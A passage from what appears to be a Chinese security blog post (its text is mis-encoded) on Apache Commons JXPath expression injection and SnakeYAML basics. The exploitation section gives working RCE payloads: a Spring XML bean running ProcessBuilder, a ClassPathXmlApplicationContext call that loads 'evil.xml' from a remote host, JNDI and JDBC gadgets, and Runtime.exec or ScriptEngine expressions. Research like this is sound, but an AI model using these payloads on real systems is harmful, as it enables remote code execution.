class="line"></span><br><span class="line">        <span class="comment">// 3) â€”â€”ã€å…³é”®ã€‘æ³¨å†Œæ‰©å±•å‡½æ•°ï¼Œå¹¶æŠŠå®ä¾‹æ”¾åˆ°å˜é‡é‡Œâ€”â€”</span></span><br><span class="line">        <span class="type">Functions</span> <span class="variable">funcs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassFunctions</span>(Dog.class, <span class="string">&quot;Dog&quot;</span>);</span><br><span class="line">        ctx.setFunctions(funcs);</span><br><span class="line">        ctx.getVariables().declareVariable(<span class="string">&quot;d&quot;</span>, dog);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.1 ç°åœ¨ç”¨æ‰©å±•å‡½æ•°è¯­æ³•è°ƒç”¨â€œå®ä¾‹æ–¹æ³•â€ï¼šDog:greet($d, ...)</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">greet</span> <span class="operator">=</span> (String) ctx.getValue(<span class="string">&quot;Dog:greet($d, &#x27;human&#x27;)&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;[method] greet =&gt; &quot;</span> + greet);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) bean è¯­ä¹‰çš„å±æ€§è¯»å†™è¿˜æ˜¯åœ¨â€œä»¥ dog ä¸ºæ ¹â€çš„ä¸Šä¸‹æ–‡é‡Œåš</span></span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">onDog</span> <span class="operator">=</span> JXPathContext.newContext(dog);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) onDog.getValue(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">age</span> <span class="operator">=</span> (Integer) onDog.getValue(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;[getter] name=&quot;</span> + name + <span class="string">&quot;, age=&quot;</span> + age);</span><br><span class="line"></span><br><span class="line">        onDog.setValue(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;dog&quot;</span>);</span><br><span class="line">        onDog.setValue(<span class="string">&quot;age&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;[setter] =&gt; &quot;</span> + dog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><p><code>org.apache.commons.jxpath.ri.compiler.ExtensionFunction#computeValue</code> å‡½æ•°å®ç°æ–¹æ³•è°ƒç”¨ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">computeValue</span><span class="params">(EvalContext context)</span> &#123;</span><br><span class="line">    Object[] parameters = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (args != <span class="literal">null</span>) &#123;</span><br><span class="line">        parameters = <span class="keyword">new</span> <span class="title class_">Object</span>[args.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">            parameters[i] = convert(args[i].compute(context));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Function</span> <span class="variable">function</span> <span class="operator">=</span></span><br><span class="line">        context.getRootContext().getFunction(functionName, parameters);</span><br><span class="line">    <span class="keyword">if</span> (function == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JXPathFunctionNotFoundException</span>(<span class="string">&quot;No such function: &quot;</span></span><br><span class="line">                + functionName + Arrays.asList(parameters));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> function.invoke(context, parameters);</span><br><span class="line">    <span class="keyword">return</span> result <span class="keyword">instanceof</span> NodeSet ? <span class="keyword">new</span> <span class="title class_">NodeSetContext</span>(context,</span><br><span class="line">            (NodeSet) result) : result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­å‡½æ•°è·å–æœ‰å¦‚ä¸‹è°ƒç”¨æ ˆï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.commons.jxpath.PackageFunctions.getFunction(PackageFunctions.java:118)</span><br><span class="line">at org.apache.commons.jxpath.ri.JXPathContextReferenceImpl.getFunction(JXPathContextReferenceImpl.java:753)</span><br><span class="line">at org.apache.commons.jxpath.ri.axes.RootContext.getFunction(RootContext.java:140)</span><br><span class="line">at org.apache.commons.jxpath.ri.compiler.ExtensionFunction.computeValue(ExtensionFunction.java:96)</span><br><span class="line">at org.apache.commons.jxpath.ri.JXPathContextReferenceImpl.getValue(JXPathContextReferenceImpl.java:353)</span><br></pre></td></tr></table></figure></div>

<p>æœ€ç»ˆåœ¨ <code>org.apache.commons.jxpath.PackageFunctions#getFunction</code> é€šè¿‡ç±»åï¼Œæ–¹æ³•åï¼Œå‚æ•°ç±»å‹å®šä½åˆ°æ–¹æ³•ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span></span><br><span class="line">    MethodLookupUtils.lookupMethod(</span><br><span class="line">        target.getClass(),</span><br><span class="line">        name,</span><br><span class="line">        parameters);</span><br></pre></td></tr></table></figure></div>

<p>æ ¹æ®æ–¹æ³•åè¿”å› <code>ConstructorFunction</code> æˆ– <code>MethodFunction</code>ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.equals(<span class="string">&quot;new&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span></span><br><span class="line">        MethodLookupUtils.lookupConstructor(functionClass, parameters);</span><br><span class="line">    <span class="keyword">if</span> (constructor != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConstructorFunction</span>(constructor);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span></span><br><span class="line">        MethodLookupUtils.lookupStaticMethod(</span><br><span class="line">            functionClass,</span><br><span class="line">            methodName,</span><br><span class="line">            parameters);</span><br><span class="line">    <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MethodFunction</span>(method);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h2><h3 id="æ„é€ å™¨åˆ©ç”¨"><a href="#æ„é€ å™¨åˆ©ç”¨" class="headerlink" title="æ„é€ å™¨åˆ©ç”¨"></a>æ„é€ å™¨åˆ©ç”¨</h3><p>Spring å½“ä¸­æœ‰ä¸¤ä¸ªç±»çš„æ„é€ å‡½æ•°è¿œç¨‹åŠ è½½é…ç½®ï¼Œå¯ä»¥æ„æˆ RCEã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.context.support.ClassPathXmlApplicationContext</span><br><span class="line">org.springframework.context.support.FileSystemXmlApplicationContext</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;exec&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext.new(\&quot;http://127.0.0.1:8888/evil.xml\&quot;)&quot;</span>;</span><br><span class="line">context.getValue(code);</span><br></pre></td></tr></table></figure></div>

<h3 id="é™æ€æ–¹æ³•åˆ©ç”¨"><a href="#é™æ€æ–¹æ³•åˆ©ç”¨" class="headerlink" title="é™æ€æ–¹æ³•åˆ©ç”¨"></a>é™æ€æ–¹æ³•åˆ©ç”¨</h3><ul>
<li><p><code>javax.naming.InitialContext#doLookup</code></p>
  <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">doLookup</span><span class="params">(Name name)</span></span><br><span class="line">    <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) (<span class="keyword">new</span> <span class="title class_">InitialContext</span>()).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>java.sql.DriverManager#getConnection</code></p>
<p>JDBC Attack</p>
</li>
<li><p><code>com.alibaba.fastjson.JSON#parseObject</code></p>
<p>æ³¨æ„è¿™é‡Œå¤–è¾¹ä¼ å‚è¦ç”¨å•å¼•å·ï¼Œjsonå­—ç¬¦ä¸²å’Œå¤–è¾¹ä¼ å‚éƒ½ç”¨åŒå¼•å·ä¼šè§£æé”™è¯¯</p>
</li>
</ul>
<h3 id="æ™®é€šæ–¹æ³•è°ƒç”¨"><a href="#æ™®é€šæ–¹æ³•è°ƒç”¨" class="headerlink" title="æ™®é€šæ–¹æ³•è°ƒç”¨"></a>æ™®é€šæ–¹æ³•è°ƒç”¨</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec(java.lang.Runtime.getRuntime(),<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line">eval(getEngineByName(javax.script.ScriptEngineManager.new(),<span class="string">&#x27;js&#x27;</span>),<span class="string">&#x27;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h1 id="SnakeYaml"><a href="#SnakeYaml" class="headerlink" title="SnakeYaml"></a>SnakeYaml</h1><p>SnakeYAML æ˜¯ä¸€ä¸ª <strong>Java çš„ YAML è§£æä¸ç”Ÿæˆåº“</strong>ï¼ˆ<code>org.yaml:snakeyaml</code>ï¼‰ã€‚å®ƒå¯ä»¥å°† YAML æ–‡æœ¬å’Œ Java å¯¹è±¡ç›¸äº’è½¬æ¢ï¼Œå¸¸ç”¨äºè¯»å–é…ç½®ã€åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–ç­‰ã€‚é»˜è®¤å®ç°å…¼å®¹ YAML 1.1ï¼›å¦æœ‰é¡¹ç›® <strong>snakeyaml-engine</strong> æ”¯æŒ YAML 1.2ã€‚</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>SnakeYAML æ ¸å¿ƒæä¾›ä¸¤ä¸ªåŠŸèƒ½ï¼š</p>
<ul>
<li><strong>ååºåˆ—åŒ–ï¼ˆLoadï¼‰</strong>: YAMLæ–‡æœ¬ â†’ Javaå¯¹è±¡ï¼ˆMap&#x2F;List&#x2F;POJOï¼‰</li>
<li><strong>åºåˆ—åŒ–ï¼ˆDumpï¼‰</strong>: Javaå¯¹è±¡ â†’ YAMLæ–‡æœ¬</li>
</ul>
<h2 id="åŸºæœ¬ä½¿ç”¨-1"><a href="#åŸºæœ¬ä½¿ç”¨-1" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h2><p>å…ˆå®šä¹‰ POJOï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    User(String name, <span class="type">int</span> age) &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    User() &#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// getter/setter å¿…é¡»æœ‰ï¼</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123; <span class="built_in">this</span>.age = age; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Javaå¯¹è±¡-â†’-YAMLå­—ç¬¦ä¸²"><a href="#Javaå¯¹è±¡-â†’-YAMLå­—ç¬¦ä¸²" class="headerlink" title="Javaå¯¹è±¡ â†’ YAMLå­—ç¬¦ä¸²"></a>Javaå¯¹è±¡ â†’ YAMLå­—ç¬¦ä¸²</h3><p>ä¸‹é¢çš„ç¤ºä¾‹ä»£ç ä½¿ç”¨ SnakeYaml å°†ä¸€ä¸ª Java POJO è½¬æ¢ä¸º YAML å­—ç¬¦ä¸²ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;æå››&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">yamlOutput</span> <span class="operator">=</span> yaml.dump(user);</span><br><span class="line">System.out.println(yamlOutput);</span><br><span class="line"><span class="comment">// !!User &#123;age: 30, name: æå››&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>è§‚å¯Ÿä¸Šè¿°ä»£ç çš„è¾“å‡ºå†…å®¹ï¼Œæˆ‘ä»¬å‘ç°åºåˆ—åŒ–ç»“æœçš„æ ¼å¼ä¸æˆ‘ä»¬å¸¸è§çš„ Yaml æ–‡ä»¶æ ¼å¼ä¸åŒï¼Œè€Œæ˜¯æœ‰ç‚¹ç±»ä¼¼ Json çš„è¯­æ³•ã€‚è¿™æ˜¯å› ä¸º Yaml è¯­æ³•æ ¼å¼æœ‰<strong>å—é£æ ¼ï¼ˆblock styleï¼‰æ˜ å°„</strong>å’Œ<strong>æµé£æ ¼ï¼ˆflow styleï¼‰æ˜ å°„</strong>ä¸¤ç§ï¼Œè¿™é‡Œå±äº<strong>æµé£æ ¼</strong>ã€‚</p>
<blockquote>
<p>YAML ç”¨ä¸‰ç§â€œèŠ‚ç‚¹â€è¡¨è¾¾æ•°æ®ç»“æ„ï¼š</p>
<ul>
<li><strong>æ ‡é‡ï¼ˆscalarï¼‰</strong>ï¼šå­—ç¬¦ä¸²ã€æ•°å­—ç­‰åŸå­å€¼</li>
<li><strong>åºåˆ—ï¼ˆsequenceï¼‰</strong>ï¼šæœ‰åºåˆ—è¡¨</li>
<li><strong>æ˜ å°„ï¼ˆmappingï¼‰</strong>ï¼šé”®å€¼å¯¹é›†åˆï¼ˆé”®å€¼å¯¹é¡ºåºä¸ä¸€å®šä¿è¯ï¼Œä½†<strong>é”®å¿…é¡»å”¯ä¸€</strong>ï¼‰</li>
</ul>
<p>ä¸ºäº†ç»„ç»‡è¿™ä¸‰ç§èŠ‚ç‚¹ï¼ŒYaml æœ‰ä¸¤ç§ä¸åŒçš„å†™æ³•ï¼š</p>
<ul>
<li><p><strong>å—é£æ ¼ï¼ˆblock styleï¼‰æ˜ å°„</strong>ï¼šç”¨<strong>æ¢è¡Œ + ç¼©è¿›</strong>åŒºåˆ†å±‚çº§ã€‚</p>
<div class="code-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">å¼ ä¸‰</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">25</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>è¡Œé¦–ç¼©è¿›åªèƒ½ç”¨<strong>ç©ºæ ¼</strong>ï¼Œ<strong>ä¸èƒ½ç”¨ Tab</strong>ï¼›åŒçº§ç¼©è¿›è¦ä¸€è‡´ã€‚</li>
<li>é”®å’Œå€¼ä¹‹é—´é€šå¸¸å†™ <code>key: value</code>ï¼ˆæœ‰ä¸€ä¸ªç©ºæ ¼ï¼‰ã€‚</li>
</ul>
</li>
<li><p><strong>æµé£æ ¼ï¼ˆflow styleï¼‰æ˜ å°„</strong>ï¼šç”¨èŠ±æ‹¬å· <code>&#123;&#125;</code> åŒ…å›´ã€ç”¨ <strong>é€—å· <code>,</code></strong> åˆ†éš”é”®å€¼å¯¹ï¼Œå’Œ JSON å¾ˆåƒã€‚YAML 1.2 çš„ç›®æ ‡ä¹‹ä¸€æ˜¯è®© <strong>JSON æˆä¸ºå®ƒçš„å­é›†</strong>ï¼Œå‡ ä¹æ‰€æœ‰ JSON éƒ½æ˜¯åˆæ³• YAMLã€‚</p>
<div class="code-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">person:</span> &#123; <span class="attr">name:</span> <span class="string">å¼ ä¸‰</span>, <span class="attr">age:</span> <span class="number">25</span> &#125;, <span class="attr">tags:</span> [<span class="string">dev</span>, <span class="string">ops</span>] &#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>æ˜ å°„</strong>ç”¨ <code>&#123; ... &#125;</code>ï¼Œ<strong>åºåˆ—</strong>ç”¨ <code>[ ... ]</code>ï¼›å…ƒç´ ä¹‹é—´ç”¨ <strong>é€—å· <code>,</code></strong> åˆ†éš”ã€‚</li>
<li>åœ¨<strong>æµé£æ ¼</strong>é‡Œï¼Œå¦‚æœé”®æ˜¯ JSON æ ·å¼çš„ï¼ˆå¦‚å¸¦å¼•å·ï¼‰ï¼Œå†’å·åå¯ä¸ç•™ç©ºæ ¼ï¼ˆä¸å»ºè®®ï¼Œå½±å“å¯è¯»æ€§ï¼‰ã€‚</li>
</ul>
</li>
</ul>
</blockquote>
<p>è€Œ <code>!!User</code> ä¹Ÿå°±æ˜¯ <code>!!T</code> æ˜¯ <strong>YAML çš„â€œç±»å‹æ ‡ç­¾ï¼ˆtagï¼‰â€è¯­æ³•</strong>ï¼Œç”¨æ¥<strong>æ˜¾å¼æ ‡æ³¨ä¸€ä¸ªèŠ‚ç‚¹çš„ç±»å‹</strong>ã€‚</p>
<blockquote>
<p>YAML é‡Œæ¯ä¸ªèŠ‚ç‚¹ï¼ˆæ ‡é‡&#x2F;åºåˆ—&#x2F;æ˜ å°„ï¼‰éƒ½æœ‰ä¸€ä¸ª<strong>æ ‡ç­¾</strong>è¡¨ç¤ºç±»å‹ã€‚</p>
<ul>
<li><code>42</code> ä¼šè¢«æ¨æ–­æˆ <code>!!int</code></li>
<li><code>&quot;hello&quot;</code> ä¼šè¢«æ¨æ–­æˆ <code>!!str</code></li>
<li><code>&#123;k: v&#125;</code> ä¼šè¢«æ¨æ–­æˆ <code>!!map</code></li>
</ul>
<p>åœ¨ YAML 1.1 é‡Œï¼Œ<code>!!</code> æ˜¯â€œ<strong>ä¸»æ ‡ç­¾å¥æŸ„</strong>ï¼ˆprimary tag handleï¼‰â€ï¼Œç­‰ä»·äºå‰ç¼€ <code>tag:yaml.org,2002:</code>ï¼Œæ‰€ä»¥ï¼š</p>
<ul>
<li><code>!!int &quot;42&quot;</code>  â‰¡  <code>!&lt;tag:yaml.org,2002:int&gt; &quot;42&quot;</code></li>
<li><code>!!str hello</code> â‰¡  <code>!&lt;tag:yaml.org,2002:str&gt; hello</code></li>
</ul>
<p><strong>ç±»å‹å‘½åç©ºé—´å‰ç¼€</strong>ç”¨çš„æ˜¯ <em>Tag URI</em> æ–¹æ¡ˆï¼ˆè§ RFC 4151ï¼‰ï¼Œé€šç”¨æ ¼å¼æ˜¯ï¼š<code>tag:&lt;authority&gt;,&lt;date&gt;:&lt;specific&gt;</code>ã€‚</p>
<p><strong><code>tag:yaml.org,2002:</code> æ˜¯ YAML è§„èŒƒå®šä¹‰çš„ä¸€æ®µâ€œç±»å‹å‘½åç©ºé—´å‰ç¼€â€ï¼ˆTag URIï¼‰</strong>ã€‚å®ƒä¸æ˜¯ç½‘é¡µé“¾æ¥ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>æ ‡è¯†ç¬¦å‰ç¼€</strong>ï¼Œç”¨æ¥ç»™ YAML é‡Œçš„å†…ç½®ç±»å‹ï¼ˆå­—ç¬¦ä¸²ã€æ•´æ•°ã€æ˜ å°„ã€åºåˆ—ç­‰ï¼‰èµ·å…¨å±€å”¯ä¸€çš„åå­—ã€‚è¿™é‡Œ <code>yaml.org</code> æ˜¯å‘½åä¸»ä½“ï¼Œ<code>2002</code> æ˜¯<strong>ç™»è®°å¹´ä»½</strong>ï¼ˆä¸æ˜¯ç‰ˆæœ¬å·ï¼‰ï¼Œåé¢è·Ÿå…·ä½“ç±»å‹åï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li><code>tag:yaml.org,2002:int</code>  â†’ æ•´æ•°</li>
<li><code>tag:yaml.org,2002:str</code>  â†’ å­—ç¬¦ä¸²</li>
<li><code>tag:yaml.org,2002:map</code>  â†’ æ˜ å°„ï¼ˆå¯¹è±¡&#x2F;å­—å…¸ï¼‰</li>
<li><code>tag:yaml.org,2002:seq</code>  â†’ åºåˆ—ï¼ˆæ•°ç»„&#x2F;åˆ—è¡¨ï¼‰</li>
</ul>
</blockquote>
<p>åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒSnakeYAML ä¼šï¼š</p>
<ol>
<li><p>é¦–å…ˆ<strong>é™æ€ç±»å‹</strong>çš„å±æ€§ä¸ä¼šå‚ä¸åºåˆ—åŒ–ã€‚</p>
</li>
<li><p>å¯¹äº <code>public</code> ç±»å‹çš„å±æ€§ï¼Œç›´æ¥é€šè¿‡<strong>åå°„å–å€¼</strong>ã€‚</p>
</li>
<li><p>å¦‚æœæ˜¯é <code>public</code> ç±»å‹çš„å±æ€§ï¼Œå¿…é¡»æ»¡è¶³æ‰ä¼šè°ƒç”¨å¯¹åº”çš„ getter æ–¹æ³•å–å€¼ï¼Œå¹¶ä¸”æ— è®º getter è¿”å›çš„æ˜¯ä¸æ˜¯å¯¹åº”å±æ€§çš„å€¼éƒ½ä»¥ getter çš„ç»“æœä¸ºå‡†ã€‚</p>
<ol>
<li>æœ‰å¯¹åº”çš„ getter å’Œ setter æ–¹æ³•ï¼›</li>
<li>getter å’Œ setter å¿…é¡»æ˜¯ <code>public</code> ç±»å‹ï¼›</li>
<li>getter çš„è¿”å›å€¼ç±»å‹å’Œ setter çš„å‚æ•°ç±»å‹å¿…é¡»ä¸å±æ€§ä¸€è‡´ã€‚</li>
</ol>
</li>
</ol>
